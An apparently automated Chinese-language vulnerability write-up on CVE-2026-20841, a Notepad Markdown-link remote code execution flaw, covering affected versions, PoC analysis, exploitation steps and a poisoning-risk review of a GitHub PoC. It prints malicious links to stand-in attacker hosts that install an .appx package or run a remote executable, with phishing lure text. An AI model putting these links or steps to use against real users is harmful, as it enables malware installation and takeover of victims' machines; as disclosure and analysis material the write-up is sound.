## CVE-2026-20841 - Windows 记事本 (Notepad) 远程代码执行 (RCE), 命令注入

**漏洞编号:** CVE-2026-20841

**漏洞类型:** 远程代码执行 (RCE), 命令注入

**影响应用:** Windows 记事本 (Notepad)

**危害等级:** 高危 (High)

**CVSS评分:** 8.8

**影响版本:** Microsoft Store分发的新版Windows记事本，包含2025年5月新增Markdown渲染及可点击链接功能的版本，直至2026年2月补丁发布前。

**利用条件:** 需要用户交互（诱导用户Ctrl+点击恶意构造的链接），目标系统需安装受影响版本的记事本应用。

**POC 可用性:** 9/10

**POC 类型:** 概念验证 (Proof of Concept)

**攻击复杂度:** 中

**投毒风险:** 5%

## 详情

CVE-2026-20841是一个高危的远程代码执行（RCE）漏洞，影响Windows系统内置的记事本（Notepad）应用程序。该漏洞的CVSS评分为8.8分，由微软在2026年2月的“补丁星期二”更新中修复。此漏洞的根源在于新版记事本（通过Microsoft Store分发，特别是包含2025年5月新增的Markdown渲染及可点击链接功能的版本）在处理特定协议链接时，未能进行充分的验证和清理。攻击者可以构造恶意的Markdown文件，其中嵌入了指向任意应用程序或命令的恶意协议链接，如`ms-appinstaller://`或`file://`。当用户在记事本中打开此文件并被诱导Ctrl+点击恶意链接时，系统将执行攻击者预设的操作，从而实现远程代码执行或恶意应用安装。

**POC有效性分析:**
提供的POC代码包含两个Markdown文件：`PoC.md`和`README.md`。`PoC.md`文件直接演示了漏洞的两种利用方式，其内容简洁明了，具有极高的有效性：
1.  `[poc](ms-appinstaller://?source=https://evil/xxx.appx)`：此链接利用`ms-appinstaller`协议，尝试从指定的URL安装一个应用程序包（.appx）。在实际攻击中，`https://evil/xxx.appx`会被替换为攻击者控制的恶意应用分发服务器地址。如果用户点击，Windows系统可能会直接提示安装恶意应用，绕过传统的浏览器下载和执行警告。这为攻击者提供了一种隐蔽的恶意软件分发和安装途径。
2.  `[poc](file://C:/windows/system32/cmd.exe)`：此链接利用`file://`协议，尝试直接执行本地路径下的程序。在POC中，它指向了系统内置的`cmd.exe`，证明了执行任意本地命令的能力。在实际攻击中，攻击者可以将此路径替换为指向任意可执行文件（例如，`file:///\attacker-ip\share\malicious.exe`），从而在受害者的机器上执行任意代码，实现完整的远程代码执行。这个POC以最小的复杂性，直接且清晰地展示了漏洞的两种关键利用途径，验证了记事本在处理这些协议链接时的信任边界失效问题。`README.md`文件则进一步提供了关于此PoC的背景、系统要求及使用指导，表明这是一个用于教育和意识提升的工具，尽管其描述的PoC工具本身并非直接提供的代码。

**利用步骤:**
1.  **构造恶意文件**: 攻击者创建一个Markdown文件（例如，`report.md`），在其中嵌入精心构造的恶意链接，如 `[点击下载最新报告](ms-appinstaller://?source=https://attacker.com/malicious_app.appx)` 或 `[查看详情](file://C:/Users/Public/malware.exe)`。
2.  **分发**: 攻击者通过钓鱼邮件、恶意网站下载、即时通讯工具等方式，将此恶意Markdown文件发送给受害者，或诱导受害者打开包含该文件的链接。
3.  **诱导点击**: 受害者在Windows记事本中打开该恶意文件。由于记事本是用户高度信任的基础应用，受害者可能不设防。当受害者被诱导（例如，被文字内容欺骗）并使用Ctrl+点击方式激活恶意链接时，漏洞被触发。
4.  **代码执行/应用安装**: 根据攻击者构造的链接，系统将执行恶意应用程序（如`malware.exe`）或尝试安装恶意`.appx`应用，从而导致远程代码执行、系统受控、数据窃取等恶意行为。

**投毒风险分析:**
对于本次提供的POC代码，其投毒风险评估为低（5%）。具体分析如下：
1.  **代码形态**: 所提供的POC代码为两个纯文本的Markdown文件（`PoC.md`和`README.md`）。`PoC.md`是演示漏洞利用的Markdown语法，它本身不包含任何可执行代码、脚本、混淆逻辑或外部引用（除了作为攻击目标的URL）。`README.md`是项目的说明文档，同样是纯文本格式。
2.  **非可执行性**: 纯文本文件本身无法被“投毒”为执行恶意操作的代码。它们仅作为漏洞的“输入”或“说明”。`PoC.md`仅包含URI，它并非在执行，而是等待被记事本解释执行。`README.md`也只是描述了一个用于展示漏洞的“工具”，并指导用户从GitHub Releases下载该工具的二进制文件。它本身不是那个工具，也没有尝试下载或执行任何内容。
3.  **外部下载指示**: `README.md`中提及了从GitHub Releases下载PoC工具二进制文件的链接。理论上，如果攻击者控制了GitHub仓库或其发布流程，他们可以替换发布的二进制文件，使其包含恶意载荷。然而，这是关于“用户从外部下载并执行二进制文件”的风险，而不是“POC代码本身被投毒”的风险。本次任务要求分析的是**提供的POC代码**的投毒风险，而不是其指导用户下载的外部资源的风险。提供的`.md`文件本身是干净的。
4.  **无恶意行为**: 仔细审查提供的两个`.md`文件，未发现任何试图执行混淆代码、调用`eval`函数、进行可疑网络请求、或利用标准库进行攻击的行为。它们的唯一“恶意”之处在于演示了如何利用Markdown链接功能来触发记事本的漏洞，这符合POC的定义。

综上所述，由于提供的POC代码是纯文本格式，不包含任何可执行或动态加载的代码，因此其作为代码载体的投毒风险极低。任何潜在的风险主要来自于用户在遵循`README.md`的指示时，从外部下载并执行未经彻底验证的二进制文件。但在本分析中，我们关注的是提供的原始POC代码的安全性。

**项目地址:** https://github.com/404godd/CVE-2026-20841-PoC

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2026-20841
